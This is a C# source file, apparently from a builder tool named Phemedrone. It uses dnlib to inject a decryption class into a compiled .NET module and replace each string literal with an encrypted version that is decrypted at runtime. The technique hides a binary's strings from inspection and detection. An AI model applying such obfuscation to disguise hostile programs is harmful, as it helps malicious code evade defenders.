using System.Collections.Generic;
using System.Linq;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Phemedrone.Tools.Xor;

namespace Phemedrone.Tools.Builder
{
    public class StringObfuscation
    {
        public static void Run(ModuleDef module)
        {
            var donorModule = ModuleDefMD.Load(typeof(Decryption).Module);
            var typeDef = donorModule.ResolveTypeDef(MDToken.ToRID(typeof(Decryption).MetadataToken));
            
            var newTypeDef = new TypeDefUser("Phemedrone", "Decryption", module.CorLibTypes.Object.TypeDefOrRef)
                {
                    Attributes = TypeAttributes.Class | TypeAttributes.Public
                };
            module.Types.Add(newTypeDef);

            var members = Injection.Inject(typeDef, newTypeDef, module);
            var init = (MethodDef)members.Single(method => method.Name == "Decrypt");

            var key = RandomValues.GenerateKey();
            var t = module.Types.FirstOrDefault(x => x.Namespace == newTypeDef.Namespace && x.Name == newTypeDef.Name);
            var ctor = t?.FindStaticConstructor();
            ctor.Body.Instructions[0].Operand = key;
            
            foreach (var type in module.Types.Where(x  => x.Namespace.Length != 0))
            {
                void ObfuscateStrings(MethodDef methodDef)
                {
                    methodDef.Body.SimplifyBranches();
                    var instructions = methodDef.Body.Instructions;
                    var patched = new List<Instruction>();
                    for (var i = 0; i < instructions.Count; i++)
                    {
                        var instruction = instructions[i];
                        if (instruction.OpCode == OpCodes.Ldstr)
                        {
                            var field = instructions[i + 1].Operand;
                            if (field is FieldDef def)
                            {
                                if (def.HasConstant || def.IsInitOnly)
                                {
                                    patched.Add(instruction);
                                    continue;
                                }
                            }

                            var original = instruction.Operand as string;
                            var encrypted = Encryption.Encrypt(original, key);
                            instructions[i].Operand = encrypted;
                            patched.Add(instructions[i]);
                            patched.Add(Instruction.Create(OpCodes.Call, init));
                        }
                        else
                        {
                            patched.Add(instruction);
                        }
                    }
                    instructions.Clear();
                    foreach (var patch in patched)
                    {
                        instructions.Add(patch);
                    }
                    methodDef.Body.OptimizeBranches();
                }
                
                foreach (var method in type.Methods)
                {
                    if (method.HasBody) ObfuscateStrings(method);
                }
                foreach (var nestedType in type.NestedTypes)
                {
                    foreach (var method in nestedType.Methods)
                    {
                        if (method.HasBody) ObfuscateStrings(method);
                    }
                }
            }
        }
    }
}